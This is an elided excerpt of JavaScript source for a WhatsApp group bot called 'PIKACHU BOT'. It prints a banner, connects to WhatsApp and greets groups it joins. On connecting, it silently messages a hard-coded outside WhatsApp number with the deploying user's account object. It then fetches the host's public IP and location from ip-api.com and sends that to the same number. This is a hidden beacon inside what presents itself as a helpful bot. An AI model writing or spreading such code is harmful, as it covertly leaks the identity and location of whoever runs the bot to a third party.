...
prefix = '#'
shp = '⬡'
owner = "916380260672@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["TURBO MODS", "Chrome", "3.0"];
...
console.log(color(figlet.textSync(`${spc1}            PIKACHU BOT`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('[PIKACHU BOT]'), color(' PIKACHU 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`916380260672@s.whatsapp.net`, `*Hi Owner Turbo, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Turbo Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Toxic.jpg'),sourceUrl:"https://wa.me/916380260672?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("916380260672@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Turbo Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Toxic.jpg'),sourceUrl:"https://wa.me/916380260672?text=Hello bro"}}})
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, im pikachu bot, ready to help you here i am made by turbo", "conversation");
      }
